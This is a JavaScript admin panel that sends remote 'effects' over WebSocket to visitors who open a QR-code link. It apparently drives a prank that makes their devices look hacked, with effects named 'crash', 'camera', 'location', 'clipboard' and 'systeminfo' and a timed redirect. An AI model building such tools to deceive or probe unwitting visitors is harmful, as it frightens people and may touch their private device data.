// Admin Control Panel JavaScript

let ws = null;
let reconnectInterval = null;
let effectCount = 0;
let autoModeActive = false;
let autoModeInterval = null;

// Get WebSocket URL
function getWebSocketUrl() {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const host = window.location.host;
    return `${protocol}//${host}`;
}

// Initialize
function init() {
    console.log('🎮 Admin Panel Initializing...');

    // Set spectator URL
    const spectatorUrl = `${window.location.protocol}//${window.location.host}/spec`;
    document.getElementById('spectatorUrl').textContent = spectatorUrl;

    // Generate QR code
    new QRCode(document.getElementById('qrcode'), {
        text: spectatorUrl,
        width: 200,
        height: 200,
        colorDark: '#000000',
        colorLight: '#ffffff',
        correctLevel: QRCode.CorrectLevel.H
    });

    // Connect to WebSocket
    connectWebSocket();

    // Add keyboard shortcuts
    document.addEventListener('keydown', handleKeyboard);
}

// Connect to WebSocket
function connectWebSocket() {
    const wsUrl = getWebSocketUrl();
    log(`Connecting to ${wsUrl}...`);

    updateStatus('Connecting...', false);

    try {
        ws = new WebSocket(wsUrl);

        ws.onopen = () => {
            log('✅ Connected to server');
            updateStatus('Connected', true);

            // Register as controller
            ws.send(JSON.stringify({
                type: 'register',
                role: 'controller'
            }));

            // Clear reconnect interval
            if (reconnectInterval) {
                clearInterval(reconnectInterval);
                reconnectInterval = null;
            }
        };

        ws.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                handleMessage(data);
            } catch (e) {
                console.error('Error parsing message:', e);
            }
        };

        ws.onerror = (error) => {
            console.error('WebSocket error:', error);
            log('❌ Connection error');
            updateStatus('Error', false);
        };

        ws.onclose = () => {
            log('🔌 Disconnected from server');
            updateStatus('Disconnected', false);

            // Try to reconnect
            if (!reconnectInterval) {
                reconnectInterval = setInterval(() => {
                    log('🔄 Attempting to reconnect...');
                    connectWebSocket();
                }, 3000);
            }
        };

    } catch (e) {
        console.error('Failed to create WebSocket:', e);
        updateStatus('Failed', false);
    }
}

// Handle incoming messages
function handleMessage(data) {
    console.log('📨 Received:', data);

    switch (data.type) {
        case 'registered':
            log(`✅ Registered as ${data.role}`);
            updateSpectatorCount(data.spectators || 0);
            break;

        case 'spectator_connected':
            log(`👀 Spectator connected (Total: ${data.total})`);
            updateSpectatorCount(data.total);
            getSpectators();
            break;

        case 'spectator_disconnected':
            log(`👋 Spectator disconnected (Total: ${data.total})`);
            updateSpectatorCount(data.total);
            getSpectators();
            break;

        case 'effect_sent':
            log(`✨ Effect "${data.effect}" sent to ${data.recipients} spectator(s)`);
            effectCount++;
            document.getElementById('effectCount').textContent = effectCount;
            break;

        case 'spectator_list':
            displaySpectators(data.spectators);
            break;
    }
}

// Send effect command
function sendEffect(effectName) {
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        log('❌ Not connected to server!');
        alert('Not connected to server!');
        return;
    }

    const message = JSON.stringify({
        type: 'effect',
        effect: effectName
    });

    ws.send(message);
    log(`📤 Sent effect: ${effectName}`);
}

// Toggle auto mode
function toggleAutoMode() {
    autoModeActive = !autoModeActive;
    const btn = document.getElementById('autoModeBtn');

    if (autoModeActive) {
        btn.textContent = '⏸️ Stop Auto Mode';
        btn.classList.add('danger');
        startAutoMode();
        log('🤖 Auto mode started');
    } else {
        btn.textContent = '▶️ Start Auto Mode';
        btn.classList.remove('danger');
        stopAutoMode();
        log('⏹️ Auto mode stopped');
    }
}

// Start auto mode
function startAutoMode() {
    const effects = [
        'glitch', 'flicker', 'shake', 'static', 'matrix', 'crash',
        'gallery', 'apps', 'camera', 'location', 'notifications',
        'systeminfo', 'clipboard'
    ];

    function triggerRandomEffect() {
        if (!autoModeActive) return;

        const randomEffect = effects[Math.floor(Math.random() * effects.length)];
        sendEffect(randomEffect);

        const minDelay = parseInt(document.getElementById('minDelay').value) * 1000;
        const maxDelay = parseInt(document.getElementById('maxDelay').value) * 1000;
        const randomDelay = Math.random() * (maxDelay - minDelay) + minDelay;

        autoModeInterval = setTimeout(triggerRandomEffect, randomDelay);
    }

    triggerRandomEffect();
}

// Stop auto mode
function stopAutoMode() {
    if (autoModeInterval) {
        clearTimeout(autoModeInterval);
        autoModeInterval = null;
    }
    sendEffect('reset');
}

// Get spectator list
function getSpectators() {
    if (!ws || ws.readyState !== WebSocket.OPEN) return;

    ws.send(JSON.stringify({
        type: 'get_spectators'
    }));
}

// Display spectators
function displaySpectators(spectators) {
    const container = document.getElementById('spectatorList');

    if (spectators.length === 0) {
        container.innerHTML = '<p style="opacity: 0.6;">No spectators connected</p>';
        return;
    }

    container.innerHTML = spectators.map((s, i) => `
        <div class="spectator-item">
            <strong>Spectator #${i + 1}</strong>
            <small>${s.deviceInfo.userAgent || 'Unknown device'}</small>
        </div>
    `).join('');
}

// Update status
function updateStatus(text, connected) {
    document.getElementById('connectionStatus').textContent = text;
    const indicator = document.getElementById('statusIndicator');

    if (connected) {
        indicator.classList.add('connected');
    } else {
        indicator.classList.remove('connected');
    }
}

// Update spectator count
function updateSpectatorCount(count) {
    document.getElementById('spectatorCount').textContent = count;
}

// Log message
function log(message) {
    const logPanel = document.getElementById('logPanel');
    const timestamp = new Date().toLocaleTimeString();
    const entry = document.createElement('div');
    entry.className = 'log-entry';
    entry.textContent = `[${timestamp}] ${message}`;
    logPanel.insertBefore(entry, logPanel.firstChild);

    // Keep only last 50 entries
    while (logPanel.children.length > 50) {
        logPanel.removeChild(logPanel.lastChild);
    }
}

// Copy URL
function copyUrl() {
    const url = document.getElementById('spectatorUrl').textContent;
    navigator.clipboard.writeText(url).then(() => {
        log('📋 URL copied to clipboard');
        alert('URL copied to clipboard!');
    }).catch(err => {
        console.error('Failed to copy:', err);
    });
}

// Update redirect settings
function updateRedirectSettings() {
    const maxEffects = parseInt(document.getElementById('maxEffects').value);

    if (!ws || ws.readyState !== WebSocket.OPEN) {
        alert('Not connected to server!');
        return;
    }

    // Send settings to all spectators
    ws.send(JSON.stringify({
        type: 'config',
        config: {
            maxEffectsBeforeRedirect: maxEffects
        }
    }));

    log(`⚙️ Updated redirect setting: ${maxEffects} effects`);
    alert(`Settings updated! Spectators will redirect after ${maxEffects} effects.`);
}

// Keyboard shortcuts
function handleKeyboard(e) {
    if (e.target.tagName === 'INPUT') return;

    switch (e.key) {
        case '1': sendEffect('glitch'); break;
        case '2': sendEffect('crash'); break;
        case '3': sendEffect('flicker'); break;
        case '4': sendEffect('shake'); break;
        case '5': sendEffect('static'); break;
        case '6': sendEffect('matrix'); break;
        case '7': sendEffect('gallery'); break;
        case '8': sendEffect('apps'); break;
        case '0': sendEffect('reset'); break;
        case ' ': e.preventDefault(); toggleAutoMode(); break;
    }
}

// Initialize when DOM ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}

// Clean up on unload
window.addEventListener('beforeunload', () => {
    if (ws) ws.close();
    if (autoModeInterval) clearTimeout(autoModeInterval);
});
